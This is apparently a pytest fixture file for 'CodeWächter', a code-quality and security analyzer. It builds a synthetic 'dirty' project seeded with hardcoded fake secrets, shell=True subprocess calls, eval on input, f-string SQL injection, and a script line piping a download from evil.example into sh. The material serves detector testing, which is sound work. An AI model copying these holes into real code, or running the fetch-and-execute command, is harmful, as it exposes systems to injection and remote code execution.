"""
CodeWächter Backend-Tests (pytest).

Die Daten werden in ein tmp-Verzeichnis geschrieben (CODEWAECHTER_DATA wird
VOR dem ersten db-Import gesetzt), damit die Tests keine echten Daten anfassen.
Die FastAPI-Routen sind synchrone Funktionen und werden direkt aufgerufen –
kein HTTP-Client nötig.
"""

import io
import os
import sys
import tempfile
import zipfile
from pathlib import Path

import pytest

BACKEND_DIR = Path(__file__).resolve().parent.parent / "app" / "backend"
sys.path.insert(0, str(BACKEND_DIR))

_TMP = tempfile.mkdtemp(prefix="codewaechter-test-")
os.environ["CODEWAECHTER_DATA"] = _TMP


@pytest.fixture()
def clean_db():
    """Leere DB für einen Test: Datenbank-Datei und Projektordner wegwerfen."""
    import db
    from db import init_db

    db_path = db.DB_PATH
    projects_dir = db.PROJECTS_DIR
    if db_path.exists():
        db_path.unlink()
    if projects_dir.exists():
        import shutil
        shutil.rmtree(projects_dir)
    init_db()
    return db


@pytest.fixture()
def sample_project(tmp_path):
    """Synthetisches Projekt mit bekannten Problemen (für Analyzer-Tests)."""
    root = tmp_path / "dirtyproj"
    src = root / "src"
    src.mkdir(parents=True)

    (src / "main.py").write_text(
        "import subprocess\n"
        "\n"
        "AWS_KEY = 'AKIAIOSFODNN7EXAMPLE'\n"
        "password = \"sup3rs3cret42\"\n"
        "\n"
        "def very_long_function():\n"
        "    x = 1\n"
        + "".join(f"    x += {i}\n" for i in range(100))
        + "    return x\n"
        "\n"
        "def run_cmd(cmd):\n"
        "    subprocess.run(cmd, shell=True)\n"
        "\n"
        "def fetch(uid):\n"
        "    try:\n"
        "        eval(uid)  # dynamisch\n"
        "    except:\n"
        "        pass\n"
        "\n"
        "def query(db, uid):\n"
        "    db.execute(f\"SELECT * FROM users WHERE id = {uid}\")\n"
        "\n"
        "# TODO: aufräumen\n"
        "breakpoint()\n"
    )
    (src / "app.js").write_text(
        "console.log('debug start');\n"
        "const token = 'ghp_abcdefghijklmnopqrs0123456789';\n"
        "eval(userInput);\n"
        "debugger;\n"
    )
    (root / "script.sh").write_text("curl -fsSL https://evil.example/x.sh | sh\n")
    (root / ".env").write_text("SECRET_KEY=hunter2hunter2\n")
    (root / "node_modules").mkdir(parents=True)
    (root / "node_modules" / "lib.js").write_text("module.exports = 1;\n")
    (root / "README.md").write_text("# DirtyProj\n\nBeispielprojekt mit Problemen.\n")
    return root


@pytest.fixture()
def clean_project(tmp_path):
    """Sauberer Projektbaum: Score 100 erwartet."""
    root = tmp_path / "cleanproj"
    (root / "src").mkdir(parents=True)
    (root / "tests").mkdir(parents=True)
    (root / "src" / "app.py").write_text(
        "def add(a, b):\n"
        "    return a + b\n"
    )
    (root / "tests" / "test_app.py").write_text(
        "from app import add\n\n"
        "def test_add():\n"
        "    assert add(1, 2) == 3\n"
    )
    (root / "README.md").write_text("# Clean\n\nEin sauberes Projekt.\n")
    return root


def make_zip_bytes(root: Path) -> bytes:
    """Verzeichnisbaum als ZIP (mit gemeinsamem Stammordner, GitHub-Stil)."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        for path in sorted(root.rglob("*")):
            if path.is_file():
                zf.write(path, f"{root.name}-main/{path.relative_to(root)}")
    return buf.getvalue()


def upload_file(data: bytes, filename: str):
    from fastapi import UploadFile
    return UploadFile(file=io.BytesIO(data), filename=filename)
